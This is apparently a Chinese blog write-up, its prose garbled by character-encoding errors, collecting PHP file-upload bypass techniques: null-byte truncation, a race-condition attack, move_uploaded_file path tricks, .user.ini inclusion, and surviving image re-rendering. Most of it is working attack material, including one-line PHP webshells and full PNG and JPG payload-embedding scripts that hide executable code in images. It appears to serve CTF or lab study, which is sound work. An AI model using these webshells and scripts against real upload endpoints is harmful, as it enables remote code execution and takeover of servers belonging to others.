<h1 id="00æˆªæ–­â€“1"><a href="#00æˆªæ–­â€“1" class="headerlink" title="00æˆªæ–­â€“1"></a>00æˆªæ–­â€“1</h1><p>æƒ³è¦åˆ©ç”¨00æˆªæ–­éœ€è¦ä¸€äº›æ¡ä»¶ï¼š</p>
<blockquote>
<p>phpç‰ˆæœ¬è¦å°äº5.3.4ï¼Œ5.3.4åŠä»¥ä¸Šå·²ç»ä¿®å¤è¯¥é—®é¢˜<br>magic_quotes_gpcéœ€è¦ä¸ºOFFçŠ¶æ€</p>
</blockquote>
<p>0x00ï¼Œ%00ï¼Œ&#x2F;00ä¹‹ç±»çš„æˆªæ–­ï¼Œéƒ½æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯ä¸åŒè¡¨ç¤ºè€Œå·²</p>
<p>ä¸Šä¼ 1.pngï¼Œå¹¶æ„é€ ä¸€ä¸ªnew.php<br>å³&#x2F;upload&#x2F;new.php%001.pngï¼Œç»è¿‡è§£æå1.pngè¢«æˆªæ–­</p>
<p><img src="/img/summary/file_upload-8.jpg"></p>
<p>è®¿é—®new.php<br>æ‰§è¡ŒæˆåŠŸ</p>
<p><img src="/img/summary/file_upload-9.jpg"></p>
<h1 id="00æˆªæ–­â€“2"><a href="#00æˆªæ–­â€“2" class="headerlink" title="00æˆªæ–­â€“2"></a>00æˆªæ–­â€“2</h1><p>POSTå‹çš„00æˆªæ–­<br>éœ€è¦æ‰‹åŠ¨è§£ç ä¸€æ¬¡</p>
<p><img src="/img/summary/file_upload-10.jpg"></p>
<p><img src="/img/summary/file_upload-11.jpg"></p>
<h1 id="æ¡ä»¶ç«äº‰"><a href="#æ¡ä»¶ç«äº‰" class="headerlink" title="æ¡ä»¶ç«äº‰"></a>æ¡ä»¶ç«äº‰</h1><p>ä¾‹å­:å…ˆå­˜å‚¨æ–‡ä»¶ï¼Œå†åˆ¤æ–­æ˜¯å¦åˆæ³•ï¼Œç„¶ååˆåˆ é™¤<br>é¦–å…ˆå°†æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œç„¶åæ£€æµ‹æ–‡ä»¶åç¼€åï¼Œå¦‚æœä¸ç¬¦åˆæ¡ä»¶ï¼Œå°±åˆ æ‰ï¼Œå…¸å‹çš„â€œå¼•ç‹¼å…¥å®¤â€</p>
<p>æ”»å‡»:é¦–å…ˆä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶<br>å½“ç„¶è¿™ä¸ªæ–‡ä»¶ä¼šè¢«ç«‹é©¬åˆ æ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨å¤šçº¿ç¨‹å¹¶å‘çš„è®¿é—®ä¸Šä¼ çš„æ–‡ä»¶ï¼Œæ€»ä¼šæœ‰ä¸€æ¬¡åœ¨ä¸Šä¼ æ–‡ä»¶åˆ°åˆ é™¤æ–‡ä»¶è¿™ä¸ªæ—¶é—´æ®µå†…è®¿é—®åˆ°ä¸Šä¼ çš„phpæ–‡ä»¶ï¼Œä¸€æ—¦æˆ‘ä»¬æˆåŠŸè®¿é—®åˆ°äº†ä¸Šä¼ çš„æ–‡ä»¶ï¼Œé‚£ä¹ˆå®ƒå°±ä¼šå‘æœåŠ¡å™¨å†™ä¸€ä¸ªshellã€‚</p>
<p><code>&lt;?php fputs(fopen(&#39;xiao.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_REQUEST[1]);?&gt;&#39;);?&gt;</code></p>
<p>åˆ©ç”¨burpçš„æŠ“åŒ…å’Œçˆ†ç ´åŠŸèƒ½å³å¯å®ç°æ¡ä»¶ç«äº‰ï¼ˆæˆ–æ˜¯åˆ©ç”¨è„šæœ¬ï¼Œå¦‚è¾ƒä¸ºæ–¹ä¾¿çš„pythonï¼‰<br>å°†ä¸Šä¼ çš„shellæ— é™å‘é€ï¼Œå¦ä¸€è¾¹æ— é™è®¿é—®è¿™ä¸ªshellï¼Œè¶ä¸Šä¼ å’Œåˆ é™¤çš„é—´éš™ç”Ÿæˆwebshell</p>
<h1 id="move-uploaded-fileç»•è¿‡"><a href="#move-uploaded-fileç»•è¿‡" class="headerlink" title="move_uploaded_fileç»•è¿‡"></a>move_uploaded_fileç»•è¿‡</h1><p><code>move_uploaded_file($temp_file, $img_path)</code></p>
<blockquote>
<p>ä¸Šè¿°å‡½æ•°é™¤äº† PHP 5.3.4 ä»¥ä¸‹çš„ç‰ˆæœ¬å¯ä»¥ç”¨ 00 æˆªæ–­ç»•è¿‡ï¼Œå°±çœŸçš„æ²¡æœ‰å…¶ä»–ç¼ºé™·äº†å—ï¼Ÿ</p>
</blockquote>
<p>å½“ $img_path å¯æ§çš„æ—¶å€™ï¼Œè¿˜ä¼šå¿½ç•¥æ‰ $img_path åé¢çš„ &#x2F;.</p>
<p>æ¢…å­é…’å¸ˆå‚…çš„è¿™ç¯‡<a href="https://meizjm3i.github.io/2018/04/17/%E4%BB%8E0CTF%E5%88%86%E6%9E%90move-uploaded-file%E5%87%BD%E6%95%B0%E7%9A%84%E4%B8%80%E4%B8%AA%E7%89%B9%E7%82%B9/">æ–‡ç« </a>å·²ç»è§£é‡Šçš„å¾ˆè¯¦ç»†äº†</p>
<p><img src="/img/summary/file_upload-12.jpg"></p>
<h1 id="å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ç»•è¿‡"><a href="#å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ç»•è¿‡" class="headerlink" title="å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ç»•è¿‡"></a>å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ç»•è¿‡</h1><blockquote>
<p>imagecreatefrom ç³»åˆ—æ¸²æŸ“å›¾ç‰‡éƒ½å¯èƒ½è¢«ç»•è¿‡ï¼Œæœ‰äº›ç‰¹æ®Šçš„å›¾é©¬æ˜¯å¯ä»¥é€ƒé¿è¿‡æ¸²æŸ“çš„</p>
</blockquote>
<h2 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h2><p>å…ˆä¸Šä¼ ä¸€ä¸ªGIF</p>
<p><img src="/img/summary/file_upload-gif.gif"></p>
<p>1.gifæ˜¯ä¸Šä¼ çš„<br>2.gifæ˜¯æ¸²æŸ“åçš„<br>ä½¿ç”¨010çš„æ–‡ä»¶æ¯”è¾ƒåŠŸèƒ½ï¼Œå…¶ä¸­ç°çš„éƒ¨åˆ†å°±æ˜¯å†…å®¹ä¸€è‡´çš„éƒ¨åˆ†</p>
<p><img src="/img/summary/file_upload-13.jpg"></p>
<p>å°†phpä»£ç æ’å…¥åˆ°ç°è‰²éƒ¨åˆ†ä¹‹ä¸­å³å¯</p>
<p><img src="/img/summary/file_upload-14.jpg"></p>
<p>ä¸Šä¼ åå†å¯¼å‡ºï¼Œå‘ç°phpä»£ç å¹¶æ²¡æœ‰è¢«æ¸²æŸ“æ‰</p>
<p><img src="/img/summary/file_upload-15.jpg"></p>
<h2 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h2><p>ç›´æ¥ä½¿ç”¨å¤§ç‰›çš„è„šæœ¬äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><br><br><br><span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatetruecolor</span>(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];<br>   <span class="hljs-variable">$color</span> = <span class="hljs-title function_ invoke__">imagecolorallocate</span>(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   <span class="hljs-title function_ invoke__">imagesetpixel</span>(<span class="hljs-variable">$img</span>, <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;1.png&#x27;</span>);  <span class="hljs-comment">//è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„</span><br><span class="hljs-comment">/* æœ¨é©¬å†…å®¹</span><br><span class="hljs-comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>ç”¨phpstudyç­‰è½¯ä»¶æ­å»ºä¸€ä¸ªæœ¬åœ°ç¯å¢ƒè¿è¡Œå³å¯<br>æŠŠæœ¨é©¬å’Œè„šæœ¬æ”¾åœ¨åŒä¸€ç›®å½•ä¸‹ï¼Œè®¿é—®phpå³å¯</p>
<h2 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h2><p>åŒæ ·ç›´æ¥æ”¾è„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$miniPayload</span> = <span class="hljs-string">&quot;&lt;?php system(&#x27;tac f*&#x27;);?&gt;&quot;</span>;  <span class="hljs-comment">//ä¿®æ”¹ä¸ºéœ€è¦çš„ä»£ç å³å¯</span><br><br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;gd&#x27;</span>) || !<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php-gd is not installed&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-title function_ invoke__">set_error_handler</span>(<span class="hljs-string">&quot;custom_error_handler&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$pad</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$pad</span> &lt; <span class="hljs-number">1024</span>; <span class="hljs-variable">$pad</span>++) &#123;<br>        <span class="hljs-variable">$nullbytePayloadSize</span> = <span class="hljs-variable">$pad</span>;<br>        <span class="hljs-variable">$dis</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataInputStream</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$outStream</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$extraBytes</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readShort</span>() != <span class="hljs-number">0xFFD8</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Incorrect SOI marker&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>()) &amp;&amp; (<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>() == <span class="hljs-number">0xFF</span>)) &#123;<br>            <span class="hljs-variable">$marker</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>();<br>            <span class="hljs-variable">$size</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readShort</span>() - <span class="hljs-number">2</span>;<br>            <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">skip</span>(<span class="hljs-variable">$size</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$marker</span> === <span class="hljs-number">0xDA</span>) &#123;<br>                <span class="hljs-variable">$startPos</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">seek</span>();<br>                <span class="hljs-variable">$outStreamTmp</span> = <br>                    <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                    <span class="hljs-variable">$miniPayload</span> . <br>                    <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>) . <br>                    <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>);<br>                <span class="hljs-title function_ invoke__">checkImage</span>(<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStreamTmp</span>, <span class="hljs-literal">TRUE</span>);<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$extraBytes</span> !== <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>())) &#123;<br>                        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>() === <span class="hljs-number">0xFF</span>) &#123;<br>                            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readByte !== <span class="hljs-number">0x00</span>) &#123;<br>                                <span class="hljs-keyword">break</span>;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-variable">$stopPos</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">seek</span>() - <span class="hljs-number">2</span>;<br>                    <span class="hljs-variable">$imageStreamSize</span> = <span class="hljs-variable">$stopPos</span> - <span class="hljs-variable">$startPos</span>;<br>                    <span class="hljs-variable">$outStream</span> = <br>                        <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                        <span class="hljs-variable">$miniPayload</span> . <br>                        <span class="hljs-title function_ invoke__">substr</span>(<br>                            <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>).<br>                                <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>, <span class="hljs-variable">$imageStreamSize</span>),<br>                            <span class="hljs-number">0</span>,<br>                            <span class="hljs-variable">$nullbytePayloadSize</span>+<span class="hljs-variable">$imageStreamSize</span>-<span class="hljs-variable">$extraBytes</span>) . <br>                                <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$stopPos</span>);<br>                &#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$correctImage</span>) &#123;<br>                    <span class="hljs-variable">$outStream</span> = <span class="hljs-variable">$outStreamTmp</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">checkImage</span>(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStream</span>)) &#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Success!&#x27;</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Something\&#x27;s wrong&#x27;</span>);<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$unlink</span> = <span class="hljs-literal">FALSE</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$correctImage</span>;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br>        <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$unlink</span>)<br>            <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$correctImage</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">custom_error_handler</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$errfile</span>, <span class="hljs-variable">$errline</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$extraBytes</span>, <span class="hljs-variable">$correctImage</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">FALSE</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$m</span>)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>])) &#123;<br>                <span class="hljs-variable">$extraBytes</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>];<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataInputStream</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$binData</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$size</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$order</span> = <span class="hljs-literal">false</span>, <span class="hljs-variable">$fromString</span> = <span class="hljs-literal">false</span></span>) </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-string">&#x27;&#x27;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;order = <span class="hljs-variable">$order</span>;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fromString</span>) &#123;<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>) || !<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$filename</span>))<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;File not exists [&#x27;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&#x27;]&#x27;</span>);<br>                <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-variable">$filename</span>;<br>            &#125;<br>            <span class="hljs-variable language_">$this</span>-&gt;size = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">seek</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;size - <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData));<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">skip</span>(<span class="hljs-params"><span class="hljs-variable">$skip</span></span>) </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-variable">$skip</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readByte</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>()) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$byte</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$byte</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readShort</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData) &lt; <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$short</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">2</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;order) &#123;<br>                <span class="hljs-variable">$short</span> = (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$short</span> = (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$short</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eof</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> !<span class="hljs-variable language_">$this</span>-&gt;binData||(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData) === <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>ç”¨æ³•  php exp.php 1.png<br>æ³¨æ„ï¼Œè¦å…ˆä¸Šä¼ æ¸²æŸ“ä¸€æ¬¡å†è¿›è¡Œè„šæœ¬æ¸²æŸ“<br>æˆ‘åœ¨æœ¬åœ°ç¯å¢ƒè¯•äº†å¥½å¤šå¼ jpgå›¾ç‰‡ï¼ŒåŒ…æ‹¬ç³»ç»Ÿæˆªå›¾çš„ï¼Œqqæˆªå›¾ï¼Œç½‘ä¸Šä¸‹è½½å›¾ç‰‡ç­‰ç­‰æ–¹å¼ï¼Œéƒ½æ²¡æœ‰æˆåŠŸ<br>ä¸è¿‡å›½å…‰å¸ˆå‚…æä¾›çš„è¿™å¼ å›¾ç‰‡å€’æ˜¯å¯ä»¥ä½¿ç”¨ï¼Œä¸çŸ¥é“æ˜¯å•¥é—®é¢˜</p>
<p><img src="/img/summary/file_upload-16.jpg"></p>
<p>å›½å…‰å¸ˆå‚…çš„jpgæ€»ç»“</p>
<p><img src="/img/summary/file_upload-17.jpg"></p>
<h1 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h1><p>ä».user.iniåè¡¥å……ä¸€ä¸‹é¶åœºä¸­æ²¡æœ‰æåˆ°çš„ç¯å¢ƒ</p>
<p>ä½¿ç”¨æ¡ä»¶:<br>å¯¹åº”ç›®å½•ä¸‹é¢æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶</p>
<p>.user.ini.å®ƒæ¯”.htaccessç”¨çš„æ›´å¹¿ï¼Œä¸ç®¡æ˜¯nginx&#x2F;apache&#x2F;IISï¼Œåªè¦æ˜¯ä»¥fastcgiè¿è¡Œçš„phpéƒ½å¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•ã€‚</p>
<p>å¦‚æœé‡‡ç”¨exif_imagetype()éªŒè¯æ–‡ä»¶åç¼€ï¼Œå¯ä»¥å°è¯•ä¸Šä¼ .user.ini</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>ä½¿ç”¨ä»»æ„ä¸€æ¡å³å¯ï¼Œè¿™ä¸¤ä¸ªé…ç½®é¡¹ç›¸å½“äºæ–‡ä»¶åŒ…å« require()<br>auto_prepend_file = &lt;filename&gt; <span class="hljs-regexp">//</span> åŒ…å«åœ¨æ–‡ä»¶å¤´<br>auto_append_file = &lt;filename&gt; <span class="hljs-regexp">//</span> åŒ…å«åœ¨æ–‡ä»¶å°¾ï¼ˆé‡åˆ°<span class="hljs-keyword">exit</span>è¯­å¥å¤±æ•ˆï¼‰<br></code></pre></td></tr></table></figure>
<p>å¦‚æœæˆåŠŸä¸Šä¼ äº†.user.iniåç›´æ¥ä¸Šä¼ å›¾ç‰‡é©¬getshellå³å¯</p>
